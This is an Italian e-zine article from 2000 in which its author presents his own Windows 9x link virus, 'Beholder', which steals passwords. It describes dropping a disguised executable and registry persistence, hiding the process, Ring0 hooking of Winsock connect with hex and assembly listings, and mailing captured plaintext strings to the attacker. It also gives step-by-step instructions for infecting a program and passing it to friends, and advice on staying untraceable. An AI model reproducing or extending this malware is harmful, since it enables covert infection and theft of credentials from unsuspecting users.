@@ -1,0 +1,595 @@
+==============================================================================
+------------[ BFi numero 8, anno 3 - 30/04/2000 - file 21 di 28 ]-------------
+==============================================================================
+
+
+-[ ViRii ]--------------------------------------------------------------------
+---[ BEH0LDER 1.03
+-----[ NaGA <tarrasque@freemail.it>
+
+			 ________________________	
+			/
+				BEHOLDER 1.03
+			 __________________________/
+
+Autore      :   NaGA
+Cosa fa     :   Wide Net Sniffer per session passwords in Windows 9x
+Cosa non fa :   Non puo' essere usato come patch per Quake
+Software    :   Masm32, Visual C++ 5, SoftIce, copy del DOS
+
+
+-INTRO
+La vita del programmatore e' abbastanza monotona: sempre il solito SQL, il
+solito VisualBasic, le solite tabelle...
+
+-L'INIZIO
+Quando a 10 anni comprai il mio primo computer dissi a mia madre che l'avrei
+usato per studiare. Poi nella mia vita arrivo il CIH che, oltre ad arrecare
+danni fisici al mio comp per un totale di 500K lire, penso' bene di troncare
+ogni mia velleita' artistica cancellando TUTTI i sorgenti contenuti nel mio
+harddisk. 
+Da quel giorno smisi di prendere per il culo RancoR per il fatto che faceva
+un backup al mese.
+Da quel giorno decisi che era venuto il momento di passare al lato oscuro
+(e di cominciare a fare i backup).
+
+L'idea del beholder mi venne in mente dopo aver visto i sorgenti del CIH
+(con relativo Tut di non mi ricordo chi) e il codice del NetRaider scritto
+da \sPIRIT\. 
+All'inizio era un idea confusa, poi tutto divenne piu' chiaro...
+
+-LE FORMALITA'
+Come al solito non mi assumo nessuna responsabilita' per l'uso che voi farete
+del programma. Se vi si fonde il computer, se l'FBI arriva a casa vostra,
+se la vostra ragazza vi lascia perche' vi masturbate davanti a codice asm,
+io non ne ho nessuna colpa (anzi mi provocherebbe un sadico piacere :) ).
+
+-COME FUNZIONA
+Cominciamo col dire che non so con certezza se il prog funziona o no.
+Come ogni tesi scientifica puo' essere smentita, ma mai dimostrata con
+certezza, cosi' anche questo programma e' stato testato con successo.
+Ma dire che il prog funziona sempre e comunque e' tutto un altro paio di 
+maniche.
+NON SONO PARENTE DI BILL GATES QUINDI NON SO SE MAMMA MICROSOFT HA CAGATO
+DELLE VERSIONI DI WINSOCK DIVERSE CON CUI IL CODICE NON FUNZIONA.
+Cambiamo allora il titolo del paragrafo...
+
+-COME DOVREBBE FUNZIONARE
+In breve il beholder e' un link virus. Quando si manda in esecuzione il prog
+a cui e' attaccato, il beholder si installa nella directory di windows sotto
+falso nome, maschera la sua presenza, inserisce una chiave nel registro in
+modo da essere lanciato ad ogni avvio, scende a Ring0 e fa un hook delle
+winsock.
+Quando un nuovo processo fa una 'connect', il beholder reindirizza la socket
+su se stesso e poi apre una sua socket col vero destinatario.
+In questo modo ogni successiva 'send' del processo sfortunato arrivera' al
+beholder. Il beholder spedisce il pacchetto anche al destinatario reale, poi
+ne esamina il contenuto. Se si tratta di una stringa (una potenziale password)
+la maila ad un nostro account nella forma:
+
+-> XX-YY-ZZ-TT-HH-LL-dati
+
+dove:
+
+XX, YY, ZZ, TT: sono i quattro campi dell'indirizzo di destinazione, 
+                in notazione puntata, scritti in esadecimale;
+HH e LL       : sono la parte alta e la parte bassa della word contente 
+                la porta di destinazione (sempre in esadecimale);
+dati          : e' la stringa spedita.
+
+Ad esempio una stringa 'ciao' spedita a 127.0.0.1 sulla porta 25
+comparira' nella forma:
+ 7F-00-00-01-00-19-ciao
+Questo e' tutto.
+
+-COME SI USA
+Trovate un prog che possa interessare a qualcuno.
+Lanciate il vostro bel programmino Bh.exe .
+Riempite i campi con 
+1) Il nome del file che volete infettare, cioe' il prog interessante
+   (deve essere un PE)
+2) Il nome che avra' il file una volta infettato
+3) Un vostro account di posta elettronica
+4) L'indirizzo (numerico o simbolico) del vostro mailer preferito
+NB: se non avete un mailer che fa Relaying da ogni mittente usate il mailer relativo
+    al vostro indirizzo di posta elettronica, che è molto meglio...
+Schiacciate il tasto Ok.
+Passate il file infettato ad un vostro amico o uploadatelo da qualche parte.
+Controllate periodicamente il vostro account di posta elettronica.
+Divertitevi.
+
+-PARLIAMO DI CODICE (Ring0 e HardCode)
+La parte di codice relativa all'interfaccia utente, al linking del codice
+virale e alla creazione del dropper e' scritta interamente in Visual C++.
+Come funziona un dropper probabilmente lo saprete gia'. Se non lo sapete,
+sicuramente troverete qualcuno capace di spiegarvelo meglio di me, quindi
+non indugiamo oltre su questo argomento.
+
+Vi basti sapere che una volta lanciato il file infettato, questo creera', dal
+codice virale (decriptandolo con chiave random e decomprimendolo), 
+un nuovo file chiamato check_dll32.exe nella directory di
+windows e lo lancera'. Questo nuovo processo e' il nostro beholder.
+N.B.: L'eseguibile bh.exe ha provveduto ad inserire (al momento 
+dell'infezione) nella parte dati del programma check_dll32.exe, l'account di 
+posta ed il nome del mailer al posto dei tag '884CACCA' e '885CACCA' (cioe' 
+le vars stealthEMail e Mailer).
+
+Per capire meglio di cosa parlero', vi consiglio di leggere il tutorial 
+insieme al codice allegato (che non riportero' qui data la sua lunghezza).
+
+Per prima cosa il programma verifica quale versione delle Winsock si sta
+usando (1 o 2) con GetModuleHandle e GetProcAddress.
+Infatti la Microsoft, per le WS2, ha creato dei bei wrapper delle funzioni
+originali, ma gli ha mappati in delle zone di memoria diverse.
+Sapendo quindi l'indirizzo di 'connect' potremo risalire alla versione in
+uso (e' molto piu' sbrigativo e sicuro che parsare la stringa della ver.).
+C'e' pero' un piccolo problema. Per le WS2 esistono un sacco di versioni
+diverse di WSock32.dll . Il loro codice e' pressocche' identico, ma vengono
+allocate in zone di memoria diverse. Per mantenere la compatibilita' 
+l'Hardcode viene rilocato in base all'indirizzo di inizio di connect (in 
+pratica vengono cambiati tutti i salti nell'Hardcode).
+
+Come avrete notato, nel codice ci sono delle parti Hardcodate. 
+Il secondo passo sara' quindi andare a modificare nell'hardcode i numeri di
+porta in relazione al layer di comunicazione (little endian o big endian).
+Per gli indirizzi non c'e' bisogno poiche' si svolge tutto in locale.
+Tutto questo e' fatto con la funzione htons.
+
+Ora si tratta di scendere a Ring0. Crea quindi un CallGate utilizzando il
+segmento 0x28 con i diritti di ringzero e con l'indirizzo della nostra 
+procedura Ring0Proc. Poi inserisce il nostro CallGate nella 
+LocalDescriptorTable al primo posto e lo richiama (per ulteriori chiarimenti
+guardatevi il codice o il relativo Tut nell'Asj1; lo trovate fra i tut di
+Ringzer0).
+Ora siamo nella procedura Ring0Proc e SIAMO a ring0!!!
+
+Ring0Proc copia il contenuto dell'hardcode nello spazio di indirizzamento
+delle API di windows. Dato che Windows si crede furbo e non ricarica i moduli
+gia' in memoria, tutti i processi che sono gia' stati lanciati e tutti quelli
+che verranno lanciati in seguito utilizzeranno la nostra versione 'ritoccata'
+delle winsock. Questo finche' rimarra' almeno un processo che utilizza le
+winsock. Infatti, quando tutti i processi che le utilizzano vengono chiusi,
+le winsock (come tutti gli altri moduli) vengono scaricate dalla memoria, per
+poi essere ricaricate da disco quando qualcun altro ne richiedera' l'utilizzo.
+Non vi preoccupate, comunque, il nostro beholder continuera' a girare fino
+allo spegnimento della macchina!!!
+Per eseguire le parti di codice aggiunto, i primi e gli ultimi 5 byte di 
+connect vengono riscritti con dei salti al codice.
+
+N.B.: Per le winsock1 il codice viene aggiunto in coda al modulo stesso, per
+      le WS2 viene aggiunto alla fine di WS2_32 (perche' in coda a WSock32 non
+      c'e' abbastanza spazio)
+
+N.B.: Le destinazioni di tutti i salti sono ovviamente cannate. Per poter 
+      vedere esattamente il codice vi consiglio di usare SoftIce.
+      Lanciate il beholder e poi fate un bel
+      'u connect' e 'u 78A6A6D1h' per le WS2 o 'u 7c3ec130h' per WS1
+      (che sono gli indirizzi dove il codice si piazza).
+
+Vediamo ora cosa contiene l'HardCode...
+
+	-Hard code per WinSock1
+
+	; Poiche' per inserire dei salti cancelliamo 5 byte di connect
+	; li ricopiamo all'inizio della nostra procedura
+	83EC1C                       sub       esp,01C 
+	56                           push      esi
+	57                           push      edi
+
+	; Il beholder deve poter utilizzare la versione originale di connect.
+	; Per farlo mette la signature 883CACCA in ebx
+	; Se la signature viene rilevata salta tutto il codice aggiunto
+	81FBCAAC3C88                 cmp       ebx,0883CACCA 
+	0F84C456FFFF                 je        0FFFF6AE3
+
+	; Legge dallo stack i parametri di connect che ci interessano
+	; struttura sockaddr in eax e socket handle in edi
+	8B44242C                     mov       eax,[esp][0002C]
+	8B7C2428                     mov       edi,[esp][00028]
+
+	; Si crea uno stack locale in modo da poter conservare i suoi
+	; dati fino alla fine della procedura
+	81EC14020000                 sub       esp,000000214
+
+	; Ricava dalla struttura sockaddr passata a connect
+	; l'indirizzo di destinazione in edx e la porta in cx
+	8B5004                       mov       edx,[eax][00004]
+	668B4802                     mov       cx,[eax][00002]
+	52                           push      edx
+	6651                         push      cx
+
+	; Redireziona sul beholder la connessione
+	B97F000001                   mov       ecx,00100007F 
+	BA06660000                   mov       edx,000006606 ; Questo viene
+							     ; cambiato da htons
+	; (pusha signature del pacchetto di inizio connessione)
+	52                           push      edx
+	90                           nop
+	894804                       mov       [eax][00004],ecx
+	66895002                     mov       [eax][00002],dx
+	33D2                         xor       edx,edx
+
+	; Infiliamo nello stack gli altri parametri utili per la send di 
+	; inizio connessione (ne parleremo dopo)
+	; flags
+	52                           push      edx
+	BA0A000000                   mov       edx,00000000A 
+	52                           push      edx
+	; dati
+	8D542408                     lea       edx,[esp][00008]
+	52                           push      edx
+	; handle della socket
+	57                           push      edi
+
+	; Ripristina lo stack e ritorna a connect
+ 	81C42E020000                 add       esp,00000022E 
+ 	E97F56FFFF                   jmp       0FFFF6AE3
+
+	; Qui siamo gia' alla fine di connect
+	; verifica la signature
+ 	81FBCAAC3C88                 cmp       ebx,0883CACCA 
+ 	7411                         je       .00040307D   
+
+	; ritorna allo stack del beholder
+ 	81EC2E020000                 sub       esp,00000022E
+
+	; chiama 'send' per inviare il pacchetto di inizio connessione 
+ 	E83DE0FFFF                   call     .0004010B4   
+ 	81C41E020000                 add       esp,00000021E
+
+	; Ricopia gli utlimi 5 byte di connect cancellati dal salto per l'hook
+ 	5F                           pop       edi
+ 	5E                           pop       esi
+ 	83C41C                       add       esp,01C 
+
+	; Azzera il valore di ritorno ed esce
+ 	33C0                         xor       eax,eax
+ 	90                           nop
+ 	90                           nop
+ 	C20C00                       retn      0000C 
+ 	
+	E92BA90000			    ; questi sono i jmp che sono messi all'inizio
+ 	E999A80000			    ; e alla fine di connect per l'hook
+
+	-Hard code per WinSock2
+
+	; Tralascio i commenti poiche' e' MOLTO simile al precedente
+	81FBCAAC3C88                 cmp       ebx,0883CACCA 
+	7448                         je       .0004030E7   
+	8B442408                     mov       eax,[esp][00008]
+	8B4C2404                     mov       ecx,[esp][00004]
+	81EC14080000                 sub       esp,000000814
+	57                           push      edi
+	8BF9                         mov       edi,ecx
+	90                           nop
+	8B5004                       mov       edx,[eax][00004]
+	668B4802                     mov       cx,[eax][00002]
+	52                           push      edx
+	6651                         push      cx
+	B97F000001                   mov       ecx,00100007F 
+	BA06660000                   mov       edx,000006606 
+	52                           push      edx
+	90                           nop
+	894804                       mov       [eax][00004],ecx
+	66895002                     mov       [eax][00002],dx
+	33D2                         xor       edx,edx
+	52                           push      edx
+	BA0A000000                   mov       edx,00000000A 
+	52                           push      edx
+	8D542408                     lea       edx,[esp][00008]
+	52                           push      edx
+	57                           push      edi
+	8B7C241A                     mov       edi,[esp][0001A]
+	81C432080000                 add       esp,000000832 
+	A1A861007A                   mov       eax,[07A0061A8]
+	E93C6D5901                   jmp       00159822D
+	90                           nop
+	90                           nop
+	90                           nop
+	3DFFFFFFFF                   cmp       eax,0FFFFFFFF
+	7420                         je       .00040311B   
+	90                           nop
+	FFD0                         call      eax
+	81FBCAAC3C88                 cmp       ebx,0883CACCA 
+	90                           nop
+	90                           nop
+	7413                         je       .00040311B 
+	81EC32080000                 sub       esp,000000832 
+	E8EB6F5901                   call      0015984FE
+	33C0                         xor       eax,eax
+	81C422080000                 add       esp,000000822
+	C20C00                       retn      0000C 
+
+	E96A92A6FE                   jmp       0FEA6A78D
+	E99392A6FE                   jmp       0FEA6A7BB
+
+N.B.: I nop ci sono per future espansioni del codice (e perche' non mi andava
+      di ricalcolarmi gli offset per i salti).
+
+A questo punto credo che abbiate un gran mal di testa, quindi cerchero'
+di tradurre il tutto in qualcosa di comprensibile...
+
+La 'connect' truccata in realta' non fa altro che saltare al nostro codice
+aggiunto dove vengono cambiati i parametri della funzione (struct sockaddr)
+inserendo indirizzo e porta del beholder. Poi prepara nello stack i parametri
+da passare alla send che viene effettuata alla fine di 'connect' (tramite un
+altro salto al nostro codice).
+Questa send serve per mandare al beholder un pacchetto di inizio connessione
+targato 666 (viva l'originalita') in cui ci sono porta e indirizzo del 
+destinatario reale. In questo modo quando il beholder riceve una conessione
+riceve anche fin da subito un pacchetto in cui c'e' il reale destinatario.
+E tutto questo e' fatto dalla connect stessa!!!
+
+Il beholder pero' doveva poter utilizzare la versione non ritoccata della 
+connect... semplice, basta inserire 0x883CACCA in ebx e la connect salta
+il codice aggiunto.
+
+Mi sono accorto che questo paragrafo sta diventando troppo lungo quindi...
+
+-TORNIAMO SULLA TERRA (Camuffamento)
+Ora abbiamo hookato l'API connect e tutto il traffico in uscita arrivera'
+al nostro beholder. Adesso si tratta di far sparire il nostro processo.
+Questa parte e' pesantemente ispirata a NetRaider, quindi thanx \sPIRIT\ :)
+
+Utilizziamo innanzitutto l'API (mal) documentata RegisterServiceProcess che,
+se non usata sotto NT, fa sparire il nostro processo dalla lista dei task
+che si ottiene con CTRL+ALT+CANC. Per richiamarla dovremo di nuovo usare
+GetModuleHandle (di kernel32) e GetProcAddress.
+A questo punto dobbiamo inserire una chiave nel registro in
+'Software\Microsoft\Windows\CurrentVersion\Run' per far lanciare il beholder
+ad ogni avvio. Chiamiamo questa key 'SystemCheck'.
+Se la chiave non esiste vuol dire che e' la prima volta che eseguiamo il 
+programma, quindi dovremo fare un paio di cose in piu'.
+Utilizziamo la funzione GetWindowsDirectory per completare i path dei
+file che si trovano nella directory di Windows.
+Adesso apriamo il file notepad, ne leggiamo la data e settiamo con questa
+la data del file chek_dll32.exe che, a questo punto, avra' un aspetto piu'
+da file 'di sistema'. Dopo aver fatto questo richiudiamo i due file
+e creiamo effettivamente la chiave SystemCheck con, ovviamente, il valore 
+"PATH\check_dll32.exe".
+Se invece la chiave esisteva gia', tutta questa parte di codice viene saltata.
+E' arrivato il momento di...
+
+
+-LA PARTE PIU' INUTILE (Main)
+Dopo aver aperto una finestra (rigorosamente invisibile) indispensabile per
+la gestione dei messaggi, inizializiamo l'uso delle Winsock con WSASturtup.
+Creiamo adesso una socket 'principale' che mettiamo in ascolto sulla porta
+0x666 (sempre piu' originale) tramite le solite bind e listen.
+Prima pero' settiamo la socket in modalita' asincrona in modo tale che ci
+ritorni un messaggio WM_LISTSOCKET ad ogni tentativo di connessione.
+Dopo aver fatto questo dobbiamo fare una piccola modifica all'account e-mail
+che il dropper ha provveduto a scrivere al posto del tag '884CACCA'.
+Aggiungiamo l'"a capo" alla fine della stealthEMail.
+Poi c'e' il ciclo di ricezione messaggi.
+Troppo facile? Avremo subito il modo di rifarci con...
+
+
+-EHI, CE L'HAI CON ME AMICO? (Gestione messaggi)
+Leggiamo innanzitutto il codice del messaggio. Se e' WM_LISTSOCKET vuol
+dire che viene dalla socket 'primaria' in ascolto sulla porta 666, quindi
+si tratta di una nuova connessione. Il controllo che si tratti di un messaggio
+di tipo FD_ACCEPT e' una pura formalita' (o quasi).
+A questo punto e' doveroso parlare di questa fantomatica tabella delle 
+connessioni (ConnBuff). Questa tabella serve per sapere dove dobbiamo buttare 
+fuori quello che ci arriva dalle socket in entrata
+La tabella e' cosi' formata:
+ ____________________________
+| hsl1 | hsr1 | add1 | port1 | 	Ogni entry e' di 16byte, 4 per elemento
+| hsl2 | hsr2 | add2 | port2 |  (la porta in realta' ne occupa solo 2,
+| ecc. | ecc. | ecc. | ecc.  |  seguiti da 2 zeri)
+ ----------------------------
+Ogni entry rappresenta una connessione dove hsl1 e' l'handle della socket
+relativa alla parte locale della connessione, hsr1 e' l'handle della socket
+relativo alla parte in remoto della connessione e add1 e port1 sono indirizzo
+e porta dell'host remoto.
+Ad esempio, se ci arriva qualcosa su hsl1 noi dobbiamo spedirla su hsr1 e
+viceversa.
+Se il primo campo di una entry e' 0 vuol dire che la entry e' libera.
+Cerchiamo quindi una entry libera nella tabella. Avremo in esi il suo 
+puntatore.
+Una volta fatta l'accept riempiamo il primo campo della tabella con l'handle
+che ci ritorna. Vedremo come riempire gli altri campi in seguito.
+All'interno del ciclo pero' avevamo incrementato anche ebx a partire da
+WM_LISTSOCKET in poi, di 2 in 2.
+A cosa sara' servito mai? Semplice. Adesso dobbiamo mettere la socket appena
+creata in modalita' asincrona e le faremo ritornare un numero di messaggio
+via via crescente, in maniera da sapere sempre da dove ci arrivano i dati.
+Mi spiego meglio: ogni volta che verra' fatta una scrittura o una chisura
+su queste socket ci verra' segnalata con un messaggio; un messaggio 
+WM_LISTSOCKET+1 vuol dire che e' la notifica di un evento proveniente
+da hsl1, WM_LISTSOCKET+2 da hsr1, WM_LISTOCKET+3 da hsl2 e cosi' via.
+Ma torniamo a noi.
+
+Se invece di WM_LISTSOCKET il messaggio ricevuto e' nel range
+WM_LISTSOCKET+1 - WM_LISTSOCKET+200, vuol dire che ci arriva da una socket
+'secondaria' (una di quelle della tabella). Dal numero di messaggio possiamo
+risalire alla coppia di socket (locale-remota) in qustione semplicemente 
+sottraendo WM_LISTSOCKET+1 e shiftando tutto a destra di un bit.
+Altrettanto semplicemente possiamo sapere se si tratta di dati in entrata o in
+uscita esaminando l'ultimo bit del messaggio (il codice mi sembra gia' chiaro
+di per se'). A questo punto se il messaggio e' di tipo FD_READ (dati in 
+arrivo) il compito di gestirlo e' lasciato alla funzione Incoming a cui 
+passiamo il numero di entry nella tabella delle connessioni e un flag che 
+indica se i dati arrivano dalla parte locale della connessione (hsl) o dalla
+parte remota (hsr). Se invece il messaggio e' di tipo FD_CLOSE (qualcuno ha 
+chiuso la connessione) usiamo ClosePair per chiudere sia hsl che hsr relativi
+e azzerare le corrispondenti entries della tabella.
+Inoltre ogni volta che c'e' un messaggio FD_CLOSE viene invocata la funzione
+EndMail. Questa funzione verifica che la connessione col mailer fosse stata
+instaurata e che gli fosse gia' stato spedito qualcosa (cMail). In caso 
+affermativo manda il carattere di fine mail '.' al mailer e chiude la
+connessione. Ovviamente, subito dopo, la connessione viene riaperta 
+con GoMail e viene iniziato il protocollo per una nuova mail. Questo perche'
+il mailer non accetta la mail se non termina con il punto. Qualche 'punto'
+bisognava pur mandarlo ogni tanto, non potevamo rischiare che la macchina
+venisse spenta prima di aver concluso almeno una mail.
+Il beholder spedisce punti ad ogni FD_CLOSE.
+Ma passiamo subito a...
+
+-IO L'HO AVUTO GRATIS CON LA VOODOO2 (Incoming)
+Innanzitutto estraiamo da ConBuff (la tabella delle connessioni) l'handle
+della socket da cui ci arrivano i dati (spero non vi spaventerete a 
+interpretare un paio di shift!). Poi usiamo ioctlsocket per avere in
+'availableData' il numero di bytes pendenti sulla socket.
+Adesso allochiamo un bel buffer della dimensione giusta e lo lockiamo.
+A questo punto c'e' un problemino.
+Vi ricordate del pacchetto di inizio connessione? Bene, e' probabile
+che un'aplicazione come IExplorer subito dopo aver fatto 'connect'
+(ed aver mandato quindi il pacchetto di inizio) mandi anche qualche altra
+cosa. Quindi adesso possiamo avere sulla socket piu' di un pacchetto accodato.
+Questo problema sorge solo col pacchetto di inizio connessione, poiche'
+per gli altri dati non e' indispensabile mantenere i confini di messaggio e
+possiamo leggere e spedire tutto in una botta. Per risolvere il problema
+utilizziamo fuffOffsetBuffer per muoverci all'interno del buffer allocato.
+Verifichiamo innanzitutto se i dati arrivano da locale o da remoto.
+
+(da locale)
+Confrontiamo ora i primi byte del pacchetto con il clientID (666) per vedere
+se si tratta del pacchetto di inizio connessione. Se e' il primo, leggiamo
+la porta e l'indirizzo di destinazione (originali) e riempiamo i campi 
+mancanti della tabella delle connessioni (hsr, add, port).
+Dopodicche' apriamo una socket verso il destinatario originale.
+A questo punto la catena e' chiusa!!!. Ogni dato che ci arrivera' potra'
+essere smistato nella giusta direzione in maniera trasparente
+all'applicazione. Per fare 'connect' dobbiamo inserire in ebx la signature
+'0x883CACCA' per aggirare il codice aggiunto all'API. Per vedere se
+si e' verificato un errore (ad esempio l'host non esiste) utiliziamo
+WSASetLastError e WSAGetLastError. 
+Nelle due versioni di 'connect' i valori di ritorno sono diversi (W la 
+documentazione Microsoft!); per avere uniformita', l'API ritoccata azzera
+il valore di ritorno. Avremo quindi bisogno di GetLastError per vedere se la
+connessione e' andata a buon fine (forse e' la mia versione bacata di 95, ma 
+la funzione ritorna dei valori pseudocasuali).
+Gli altri processi che chiameranno la connect truccata riceveranno cosi'
+sempre 0, in conformita' alle specifiche in caso di connessione avvenuta,
+poiche' la loro connect avra' sempre successo (infatti, in realta' si 
+connettono in locale).
+Se si e' verificato un errore chiudiamo la socket in entrata, azzeriamo 
+la tabella e ritorniamo.
+A questo punto settiamo la socket in modalita' asincrona e le assegnamo
+un numero di messaggio proprio come abbiamo fatto prima per la socket
+in entrata.
+Ora dobbiamo verificare se in coda al pacchetto di inizio connessione c'e'
+qualcos'altro. Per farlo sottriamo al valore availableData la dimensione
+del pacchetto di inizio. Se il risultato e' maggiore di 0 dobbiamo continuare
+a leggere. La parte di codice seguente viene eseguita anche se il pacchetto
+che ci e' arrivato non e' quello di inizio connessione (anche in questo
+caso, infatti, availableData avra' un valore maggiore di 0).
+Estraiamo dalla tabella l'handle della socket su cui li dobbiamo sbattere
+fuori (sara' quello immediatamente successivo all'handle di ingresso).
+Dopo averli sbattuti fuori controlliamo se si e' verificato un errore.
+In caso affermativo resettiamo entrambe le connessioni.
+A questo punto controlliamo il contenuto del pacchetto con la funzione 
+PacketTest. Questa funzione richiama StrLen che calcola quanti caratteri di 
+testo ci sono nel pacchetto. Se questo numero corrisponde alla lunghezza
+del messaggio (a meno di 1 per le stringhe NULL-terminated) vuol dire
+che dalle nostre porte e' uscita una stringa. In questo caso ripristiniamo
+la connessione col mailer (se questa non c'e') e spediamo il messaggio.
+Questo viene fatto per mezzo della funzione GoMail che tenta di stabilire
+una connessione col mailer (dopo averne risolto il nome) e di iniziare 
+il protocollo.
+Un breve ripasso di SMTP:
+1) helo 'nome server'
+2) mail from: 'dummy'
+2) rcpt to: 'destinatario'
+3) data
+...Dati...
+4) .   <-- Per la chiusura
+Per verificare se la connessione e' stata stabilita o meno viene settata
+la variabile isMailer. Ogni volta che vorremo mailare qualcosa, se questa
+variabile e' a NULL, dovremo richiamare GoMail.
+Prima del testo viene spedita una stringa contenente l'indirizzo e la porta
+a cui erano destinati i dati in origine. Questa stringa ha il formato che ho
+descritto nell'introduzione (COME DOVREBBE FUNZIONARE). I campi della stringa
+(indirizzo-porta) sono contenuti nella tabella delle connessioni, nella entry
+relativa alla coppia di socket in questione. La conversione in ASCII viene
+effettuata dalla funzione HexConv.
+
+(da remoto)
+Estraiamo dalla tabella la socket su cui dobbiamo sbattere i dati.
+Questa volta si trattera' di una socket locale, quindi, se siete stati
+attenti, avrete gia' intuito che il suo handle si trova esattamente
+prima di quello da cui ci sono arrivati i dati.
+
+Una volta smistati i dati deallochiamo il buffer.
+Bene, abbiamo finito, manca solo...
+
+
+-IL DUBBIO AMLETICO
+A questo punto vi chiederete dove ho usato il copy del DOS.
+Semplice, il codice virale assemblato e' stato accodato al codice del 
+'dropper-maker' con una bella 'copy /B Bh.exe + beholder.exe Bh.exe'
+dove 'Bh' era il dropper-maker e 'beholder' il nostro assemblato.
+Poi ci pensa lui (al momento del linking) a comprimerlo e a criptarlo
+a chiave random.
+
+-UNO SGUARDO AL FUTURO (Possibili sviluppi)
+Beh (older, ah, ah, sono proprio simpatico), cominciamo col dire che ci 
+sarebbe bisogno di un programmino per parsare le mail e dividere il traffico
+a seconda della destinazione, in modo da avere un output piu' leggibile.
+Il codice virale e' compresso e criptato a chiave random (per ora e' poco piu'
+di un xor), ma il tutto puo' essere migliorato.
+Il prog potrebbe anche contenere una lista di nomi di file e di chiavi per 
+potersi installare in maniera casuale.
+Potrebbe anche cambiare ad ogni installazione la porta su cui si mette in
+ascolto. Insomma il camuffamento potrebbe essere migliorato.
+Poi, per potersi fregiare del titolo di linkvirus, il beholder dovrebbe 
+potersi duplicare anche su altri file, magari intercettando le sessioni FTP 
+e linkandosi ai file in uscita (magari anche dentro agli zip); non sarebbe, 
+infatti, un granche' utile se si linkasse a file che non usciranno mai dal 
+comp dello sfortunato (ah, ti passo un nuovo editor potentissimo, si chiama 
+Notepad).
+Si potrebbe cambiare PacketTest per intercettare anche altri tipi di dato
+(cookies, query, ecc.).
+Si potrebbero inserire una serie di indirizzi di siti porno da inserire
+casualmente al posto dei parametri di connect (immaginate il vostro amico
+che si connette felice al sito della Microsoft e si ritrova invece in
+www.pompini.com)
+Potrebbe addirittura essere trasformato in un cripter trasparente alle 
+applicazioni.
+Insomma e' molto versatile, anche troppo (infatti sotto NT non funziona).
+
+
+-OUTRO
+Scrivere questo tutorial e' stato molto meno divertente che scrivere il
+codice, ma almeno questo non l'ho dovuto debuggare.
+Non so quanto abbiate capito di quello che ho scritto (so che a volte ho
+delle espressioni un po' involute), ma spero di avervi dato almeno un'idea
+di come funziona il programma. D'altra parte alcuni argomenti erano abbastanza
+lunghi e complessi da spiegare. Cmq se volete maggiori chiarimenti scrivete
+pure a 'tarrasque@freemail.it' o postate
+sul Forum di ringzer0 (http://ringzer0.cjb.net) con il topic 'beholder': saro'
+lieto di rispondere a qualsiasi domanda (che non riguardi la mia vita 
+privata).
+Ah, dimenticavo, NON utilizzate il vostro solito account di posta per il
+Beholder perche':
+A) Non si sa mai che qualcuno possa risalire a voi
+B) Potrebbe arrivarvi TANTA merda
+
+-I SALUTI 
+Ringrazio innanzitutto gli autori dei codici e dei tut a cui mi sono ispirato.
+Ringrazio in particolar modo il mio fido compagno di sventura RancoR, senza
+il quale probabilmente l'unica funzionalita' del beholder sarebbe stata
+quella di far crashare windows.
+Un grazie di cuore all'inventore delle bevande alcoliche.
+Saluto inoltre la crew di Ringzer0,|LnZ|,Paolo 'ometto tutto speciale',
+AloR (stiamo preparando un progetto per l'uni che fa paura), Pesy (la persona
+senza la quale questo progetto non avrebbe mai funzionato: la CAVIA), Cianni,
+Linda, Miki, la Bestia, Rudi, Gupy, Giamma, Maphas, Dk2DEnd, 10t80r (questo
+tut te lo mando in multicast), Teo, i demo coders della scena italiana,
+Ghisha 'ehm, no, non si puo' intercettare traffico in uscita...',
+e tutti quelli che mi sono dimenticato.
+Non ringrazio il creatore del CIH.
+
+-LA MASSIMA
+Spesso guardi la pagliuzza che e' nell'occhio dell'amico e non ti accorgi 
+della trave che hai su per il culo (anche se e' una settimana che non caghi
+e sederti ti provoca uno strano piacere).
+
+*NaGA*
+
+
+==============================================================================
+--------------------------------[ EOF 21/28 ]---------------------------------
+==============================================================================
